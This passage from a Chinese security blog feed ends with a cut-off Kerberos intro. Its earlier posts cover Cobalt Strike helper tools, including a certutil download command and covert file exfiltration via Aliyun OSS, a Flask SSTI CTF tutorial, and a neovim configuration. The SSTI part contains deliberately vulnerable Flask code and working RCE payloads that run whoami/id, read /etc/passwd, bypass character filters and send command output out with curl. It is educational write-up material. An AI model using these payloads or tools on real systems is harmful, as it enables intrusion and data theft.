powershell&quot;</span></span><br></pre></td></tr></table></figure><h2 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h2><ol><li><p>certutil下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f <span class="variable">$url</span> <span class="variable">$path</span></span><br></pre></td></tr></table></figure></li><li><p>vbs下载文件</p><p>vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。</p></li><li><p><a href="https://github.com/mnipper/EncryptedZip">EncryptedZIP</a>(压缩文件)</p><p>对目录或文件进行加密压缩，使用AES-256，使用大约100个字符的随机生成的base64密码对文件进行加密。根据提供的公共密钥对密码进行加密。压缩包提取到本地需要用EncryptedZIP解密。</p></li><li><p><a href="https://github.com/uknowsec/SharpOSS">SharpOSS</a>(上传文件)</p><p>“内网渗透的本质是信息收集”，尝尝会收集到一些体积较大的文件或者是源码进行分析利用。而网络情况复杂的情况下，通过菜刀一类webshell管理工具或CS一类C2工具来进行传输文件是非常慢的，而且aliyunOSS是白域名，比cs传输文件更为隐秘。所以会用到AliyunOSS来进行快速文件传输。所以就看了一下aliyun-oss-csharp-sdk实现了这个功能。</p></li></ol><h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p><a href="https://github.com/z1un/Z1-AggressorScripts">项目地址</a></p><p><a href="https://blog.zjun.info/">zjun’s blog</a></p><hr><h2 id="gitee地址"><a href="#gitee地址" class="headerlink" title="gitee地址"></a>gitee地址</h2><p>考虑到github在国内的git速度较慢，可到gitee进行下载。</p><p><a href="https://gitee.com/z1un/Z1-AggressorScripts">https://gitee.com/z1un/Z1-AggressorScripts</a></p><p>该项目借鉴了大量其他该类型优秀项目，所有工具皆来自互联网，并都有标注来源。不保证其安全性。</p><p>长期更新。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> AggressorScripts </tag>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Flask SSTI模板注入</title>
      <link href="2020/analysis-of-flask-ssti-template-injection.html"/>
      <url>2020/analysis-of-flask-ssti-template-injection.html</url>
      
        <content type="html"><![CDATA[<p>最近的省赛遇到一个Flask模板注入Bypass的题目，解题过程中很容易得出有过滤<code>_</code>和<code>.</code>两个字符，可惜的是在此之前几乎没有用过Flask框架，导致比赛当时极其尴尬，根本不知道如何绕过，最后队友拿出了Payload，所以赛后自己也较为系统地学习了Flask框架。</p><p>Flask框架是一个轻量化的框架，只要不是用于开发，学习成本还是很低的，很容易理解。</p><h2 id="0x01-渲染模板"><a href="#0x01-渲染模板" class="headerlink" title="0x01 渲染模板"></a>0x01 渲染模板</h2><p>在Flask中渲染有两个函数：</p><table><thead><tr><th>函数</th><th>用法</th></tr></thead><tbody><tr><td><code>render_template</code></td><td>用来渲染一个指定的文件</td></tr><tr><td><code>render_template_string</code></td><td>用来渲染一个字符串</td></tr></tbody></table><p>Flask用Jinja2作为渲染引擎，这个渲染引擎就是在html的基础上，在需要数据交互的地方加上标签标注，最后就是将这些标签解析为标准的开发语言语法。web层面的漏洞通常就在于数据交互，开发语言写得不够严谨，容易造成一系列的注入问题。Flask当然也难以避免。</p><h2 id="0x02-注入浅析"><a href="#0x02-注入浅析" class="headerlink" title="0x02 注入浅析"></a>0x02 注入浅析</h2><p>先来看看一段简单的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span>():</span></span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>为了方便本地修改调试，所以开启了<code>debug=True</code>，单从这小段代码就可以看出，传入的<code>id</code>参数直接拼接进了html中，毫无疑问直接拼接html会存在反射型xss，而且这里是Flask框架，可以执行代码，存在RCE。</p><p>这是一种不严谨的写法，安全的写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h3&gt;&#123;&#123; html &#125;&#125;&lt;/h3&gt;&#x27;</span>, html=request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>在用户输入的部分外包裹&#123;&#123; }}，这样就只是一个单纯的传参，不会引起代码执行。</p><p>接着看第一个有安全隐患的代码，直接访问，没有传入参数，显示None。</p><p><img src="https://oss.zjun.info/zjun.info/1FTi6kxIh8wagZj.png" alt="1FTi6kxIh8wagZj"></p><p>传入xss代码，不出所料，直接将其交给了前端执行。</p><p><img src="https://oss.zjun.info/zjun.info/7QGFWizJrbKpX4s.png" alt="7QGFWizJrbKpX4s"></p><p>即然是Jinja2的渲染引擎，那么其中的代码也是能够被解析执行的，因此在判断是否存在模板注入时可以用类似于简单的加减乘除法来判断。</p><p><img src="https://oss.zjun.info/zjun.info/Swz24ajcr9efOKl.png" alt="Swz24ajcr9efOKl"></p><p>本地环境构造了一个rce payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">408</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png" alt="FtGuAVP3laoILYp"></p><p>要分析这个Payload，就得先说说Python的魔术方法：</p><table><thead><tr><th>魔术方法</th><th>作用</th></tr></thead><tbody><tr><td><code>__class__</code></td><td>返回调用的参数类型</td></tr><tr><td><code>__base__</code></td><td>返回基类</td></tr><tr><td><code>__mro__</code></td><td>允许我们在当前Python环境下追溯继承树</td></tr><tr><td><code>__subclasses__()</code></td><td>返回子类</td></tr></tbody></table><p><img src="https://oss.zjun.info/zjun.info/jQZTWEfXvMJ8IuL.png" alt="jQZTWEfXvMJ8IuL"></p><p>上面打印了从str类到其父类再到其父类的所有子类。</p><p><code>[]</code>、<code>&#123;&#125;</code>、<code>&#39;&#39;</code>、<code>()</code>是Python中的内置变量。通过内置变量的一些属性或函数去访问当前Python环境中的对象继承树，可以从继承树到根对象类。利用<code>__subclasses__()</code>等函数可以再到每一个Object，这样便可以利用当前Python环境执行任意代码。</p><p>当然Python中除了str类还有list、dict、tuple，都可以进行构造，<code>__mro__</code>和<code>__base__</code>都可以返回其基类，但是<code>__base__</code>更加直接一些。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">[].__class__.__base__</span><br></pre></td></tr></table></figure><p>这里就能读取到所有的子类了，然后选择我们所要利用的类，从0开始，这里我用的是<code>&lt;class &#39;subprocess.Popen&#39;&gt;</code>这个类</p><p><img src="https://oss.zjun.info/zjun.info/frc14xjgSCGnHMN.png" alt="frc14xjgSCGnHMN"></p><p>它的位置也好确定，写一个Python遍历打印位置即可找到位置是408</p><p><img src="https://oss.zjun.info/zjun.info/VtqU96fpr4JKjaw.png" alt="VtqU96fpr4JKjaw"></p><p>这里这么多类其实很多都可以利用，选择一个比较熟悉的就行。实在不知道的呢，建议在本地随便打个Payload，丢进burp中爆破位置，比如用命令执行或文件读取的Payload，设置0到600，其实本机一共就472个类，这里设得较大，也不影响。其中可以命令执行的很多，差不多一半左右的都可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[<span class="number">343</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 文件读取</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png" alt="sp1MovDLQ2HOSmJ"></p><p>接着调用OS模块执行系统命令并读取执行结果给变量，再打印到网页。</p><p>下面是某师傅的Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png" alt="OqWJieBfrGhgwzL"></p><p>结合我们上面的分析也能很容易看懂这个Payload，相当于调用os执行whoami。</p><h2 id="0x03-Bypass"><a href="#0x03-Bypass" class="headerlink" title="0x03 Bypass"></a>0x03 Bypass</h2><p>本节部分参考<a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a>。</p><p>回到文章开头提到的在省赛遇到的题目，题中有过滤<code>_</code>和<code>.</code>两个字符，只要URL中包含这两个字符就会被拦截。</p><ul><li><strong><code>.</code>被过滤</strong></li></ul><p><code>.</code>被过滤的情况，可以利用<code>[]</code>来包裹函数，替代<code>.</code>的连接效果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">408</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png" alt="xpaVGBU9f4qRLEO"></p><ul><li><strong><code>_</code>被过滤</strong></li></ul><p>利用Hex编码<code>\x5f</code>替代<code>_</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>]()[<span class="number">408</span>][<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png" alt="UmVknaRhOirL3pK"></p><ul><li><strong><code>[</code>被过滤</strong></li></ul><p>利用<code>__getitem__</code>绕过中括号限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>)</span><br><span class="line">request.__class__.__mro__.__getitem__(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>双{被过滤</strong></li></ul><p>利用<code>&#123;% if xxx %&#125;xx&#123;% endif %&#125;</code>绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">408</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;curl http://127.0.0.1:5000/?i=`whoami`&#x27;</span>).read()%&#125;zjun&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>如果可以执行命令，利用curl将执行结果带出来。</p><p><img src="https://oss.zjun.info/zjun.info/EdA74lOaYyfKLTH.png" alt="EdA74lOaYyfKLTH"></p><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来，可见<a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a>中关于盲注部分脚本。</p><ul><li><strong><code>__</code>被过滤</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][-1][request.args.subclasses]()[408][request.args.init][request.args.globals][&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__</span><br></pre></td></tr></table></figure><ul><li><strong><code>&#39;&#39;</code>被过滤</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">343</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p></li><li><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p></li><li><p><a href="https://xz.aliyun.com/t/3679#toc-11">https://xz.aliyun.com/t/3679#toc-11</a></p></li><li><p><a href="https://zgao.top/flask%E4%B9%8Bssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://zgao.top/flask之ssti服务端模版注入漏洞分析</a></p></li><li><p><a href="https://www.0x002.com/2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/#flask">https://www.0x002.com/2020/2020重庆市教育系统网络安全攻防竞赛决赛%20-%20Web%20Writeup/#flask</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Flask </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速脚本编写场景下的neovim配置文件</title>
      <link href="2020/neovim-configuration-file-in-a-fast-scripting-scenario.html"/>
      <url>2020/neovim-configuration-file-in-a-fast-scripting-scenario.html</url>
      
        <content type="html"><![CDATA[<p>neovim相较于vim更具有优势，不管从代码本身上而言还是扩展来看，neovim更像是vim的新一代产品，neovim也基本支持vim的所有配置。 很多师傅把neovim改成了一个无比完善的IDE，功能也十分强大，但是对我而言这只是一件费时的力气活，我对neovim的使用场景仅限于简单且快速的脚本编写以及文件预览，在写很短的脚本的时候通常不愿意打开臃肿又缓慢的IDE，但是原生的neovim拿来写代码又过于硬核，所以以我的使用习惯而有了下面简洁但不失功能的neovim配置文件。</p><a id="more"></a><p>主要代码仅550行左右。</p><p>代码仓库：</p><p><a href="https://github.com/z1un/nvim">https://github.com/z1un/nvim</a></p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>首先确保<a href="https://github.com/junegunn/vim-plug">vim-plug</a>已经存在。</p><p>随后进入neovim运行<code>:PlugInstall</code>，将会自动下载插件与coc扩展。</p><p>插件列表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot; beautify</span><br><span class="line">Plug &#39;theniceboy&#x2F;eleline.vim&#39;</span><br><span class="line">Plug &#39;theniceboy&#x2F;vim-deus&#39;</span><br><span class="line">Plug &#39;mg979&#x2F;vim-xtabline&#39;</span><br><span class="line">&quot;Plug &#39;connorholyday&#x2F;vim-snazzy&#39;</span><br><span class="line">Plug &#39;mhinz&#x2F;vim-startify&#39;</span><br><span class="line">Plug &#39;bling&#x2F;vim-bufferline&#39;</span><br><span class="line">Plug &#39;bpietravalle&#x2F;vim-bolt&#39;</span><br><span class="line">Plug &#39;ryanoasis&#x2F;vim-devicons&#39;</span><br><span class="line">&quot; highlight</span><br><span class="line">Plug &#39;RRethy&#x2F;vim-hexokinase&#39;, &#123; &#39;do&#39;: &#39;make hexokinase&#39; &#125;</span><br><span class="line">Plug &#39;RRethy&#x2F;vim-illuminate&#39;</span><br><span class="line">&quot; code</span><br><span class="line">Plug &#39;Chiel92&#x2F;vim-autoformat&#39;</span><br><span class="line">Plug &#39;neoclide&#x2F;coc.nvim&#39;, &#123;&#39;branch&#39;: &#39;release&#39;&#125;</span><br><span class="line">Plug &#39;yggdroot&#x2F;indentline&#39;</span><br><span class="line">Plug &#39;wellle&#x2F;tmux-complete.vim&#39;</span><br><span class="line">Plug &#39;honza&#x2F;vim-snippets&#39;</span><br><span class="line">Plug &#39;luochen1990&#x2F;rainbow&#39;</span><br><span class="line">&quot; tree</span><br><span class="line">Plug &#39;mbbill&#x2F;undotree&#39;</span><br><span class="line">&quot; Python</span><br><span class="line">Plug &#39;Vimjas&#x2F;vim-python-pep8-indent&#39;, &#123; &#39;for&#39; :[&#39;python&#39;, &#39;vim-plug&#39;] &#125;</span><br><span class="line">Plug &#39;numirias&#x2F;semshi&#39;, &#123; &#39;do&#39;: &#39;:UpdateRemotePlugins&#39;, &#39;for&#39; :[&#39;python&#39;, &#39;vim-plug&#39;] &#125;</span><br><span class="line">Plug &#39;tweekmonster&#x2F;braceless.vim&#39;, &#123; &#39;for&#39; :[&#39;python&#39;, &#39;vim-plug&#39;] &#125;</span><br><span class="line">&quot; Git</span><br><span class="line">Plug &#39;airblade&#x2F;vim-gitgutter&#39;</span><br><span class="line">Plug &#39;theniceboy&#x2F;vim-gitignore&#39;, &#123; &#39;for&#39;: [&#39;gitignore&#39;, &#39;vim-plug&#39;] &#125;</span><br><span class="line">&quot; Taglist</span><br><span class="line">Plug &#39;liuchengxu&#x2F;vista.vim&#39;</span><br></pre></td></tr></table></figure><p>coc扩展：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">let g:coc_global_extensions &#x3D; [</span><br><span class="line">    \ &#39;coc-actions&#39;,</span><br><span class="line">    \ &#39;coc-css&#39;,</span><br><span class="line">    \ &#39;coc-phpls&#39;,</span><br><span class="line">    \ &#39;coc-diagnostic&#39;,</span><br><span class="line">    \ &#39;coc-explorer&#39;,</span><br><span class="line">    \ &#39;coc-flutter-tools&#39;,</span><br><span class="line">    \ &#39;coc-gitignore&#39;,</span><br><span class="line">    \ &#39;coc-html&#39;,</span><br><span class="line">    \ &#39;coc-json&#39;,</span><br><span class="line">    \ &#39;coc-lists&#39;,</span><br><span class="line">    \ &#39;coc-prettier&#39;,</span><br><span class="line">    \ &#39;coc-pyright&#39;,</span><br><span class="line">    \ &#39;coc-python&#39;,</span><br><span class="line">    \ &#39;coc-snippets&#39;,</span><br><span class="line">    \ &#39;coc-sourcekit&#39;,</span><br><span class="line">    \ &#39;coc-syntax&#39;,</span><br><span class="line">    \ &#39;coc-tasks&#39;,</span><br><span class="line">    \ &#39;coc-todolist&#39;,</span><br><span class="line">    \ &#39;coc-translator&#39;,</span><br><span class="line">    \ &#39;coc-tslint-plugin&#39;,</span><br><span class="line">    \ &#39;coc-tsserver&#39;,</span><br><span class="line">    \ &#39;coc-vimlsp&#39;,</span><br><span class="line">    \ &#39;coc-vetur&#39;,</span><br><span class="line">    \ &#39;coc-yaml&#39;,</span><br><span class="line">    \ &#39;coc-yank&#39;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>包括代码自动格式化，语法检查纠错，命令补全，支持html、css、json、python、sh、go、swift、lua、php、yml、vimlsp等语言代码。</p><p>支持代码修改状态管理，一键代码运行等。</p><p>除此还有neovim的美化。其中部分图标可能需要<a href="https://github.com/ryanoasis/nerd-fonts">https://github.com/ryanoasis/nerd-fonts</a></p><p>这会使得neovim看起来更酷。</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>快捷键设置：</p><ul><li><p>全局搜索，保存，退出</p><table><thead><tr><th>行为</th><th>快捷键</th></tr></thead><tbody><tr><td>上</td><td>=</td></tr><tr><td>下</td><td>-</td></tr><tr><td>清屏</td><td>q</td></tr><tr><td>保存</td><td>ctrl+s</td></tr><tr><td>退出</td><td>ctrl+q</td></tr></tbody></table></li><li><p>neovim与物理机之间的copy</p><table><thead><tr><th>行为</th><th>快捷键</th></tr></thead><tbody><tr><td>复制</td><td>Y</td></tr></tbody></table></li><li><p>Undotree</p><table><thead><tr><th>行为</th><th>快捷键</th></tr></thead><tbody><tr><td>显示可视化的撤销树</td><td>ctrl+l</td></tr></tbody></table></li><li><p>函数与变量列表</p><table><thead><tr><th>行为</th><th>快捷键</th></tr></thead><tbody><tr><td>显示函数与变量列表</td><td>V</td></tr></tbody></table></li><li><p>运行代码，支持python，java，go，php</p><table><thead><tr><th>行为</th><th>快捷键</th></tr></thead><tbody><tr><td>运行代码</td><td>ctrl+r</td></tr></tbody></table></li></ul><p>这个配置文件，我暂时没有添加markdown的预览支持，也不打算添加，因为markdown我更喜欢使用typora，启动速度也很快。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Neovim </tag>
            
            <tag> Vim </tag>
            
            <tag> Nvim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos协议到票据伪造</title>
      <link href="2020/kerberos-protocol-to-ticket-forgery.html"/>
      <url>2020/kerberos-protocol-to-ticket-forgery.html</url>
      
        <content type="html"><![CDATA[<p>目前域环境中使用的认证协议基本都是<code>Kerberos</code>，所以把<code>Kerberos</code>协议理解透彻对域渗透来说极其重要。</p><a id="more"></a><p><img src="https://oss.zjun.info/zjun.info/UsgRjNOfKrpAWPk.webp" alt="UsgRjNOfKrpAWPk"></p><p>图片来自：</p><p><a href="http://web.mit.edu/kerberos/">http://web.mit.edu/kerberos/</a></p><h2 id="0x01-Kerberos协议简化描述"><a href="#0x01-Kerberos协议简化描述" class="headerlink" title="0x01 Kerberos协议简化描述"></a>0x01 Kerberos协议简化描述</h2><p>上面的图片就是<code>Kerberos</code>的<code>logo</code>，形象为三个狗头，正好符合<code>Kerberos</code>协议中的<code>三个</code>主要角色:</p><ul><li>Client = 访问服务的客户端</li><li>Server = 提供服务的服务端</li><li>Key Distribution Center（KDC）= 密钥分发中心 = Domain Controller（DC）</li></ul><p>其中<code>KDC</code>又包含以下两部分：</p><ul><li>Authentication Server（AS）= 认证服务</li><li>Ticket Granting Server（TGS）= 票据授权服务</li></ul><p><img src="https://oss.zjun.info/zjun.info/7UptSByn4RarV8b.webp" alt="7UptSByn4RarV8b"></p><p><code>Kerberos</code>协议简要描述如下：</p><ol><li><p>客户端发送自己的用户名到<code>KDC</code>服务器以向<code>AS</code>服务进行认证。</p></li><li><p><code>KDC</code>服务器会生成相应的<code>TGT</code>(<code>Ticket Granting Ticket</code>)票据，打上时间戳，在本地数据库中查找该用户的密码，并用该密码对<code>TGT</code>进行加密，将结果发还给客户端。</p></li><li><p>客户端收到该信息，使用自己的密码进行解密之后，得到<code>TGT</code>票据。这个<code>TGT</code>会在一段时间之后失效，也有一些会话管理器(<code>session manager</code>)能在用户登陆期间进行自动更新。</p></li><li><p>当客户端需要使用一些特定服务的时候，客户端就发送<code>TGT</code>到<code>KDC</code>服务器中的<code>TGS</code>服务。</p></li><li><p>当该用户的<code>TGT</code>验证通过并且其有权访问所申请的服务时，<code>TGS</code>服务会生成一个该服务所对应的票据(<code>ticket</code>)和会话密钥(<code>session 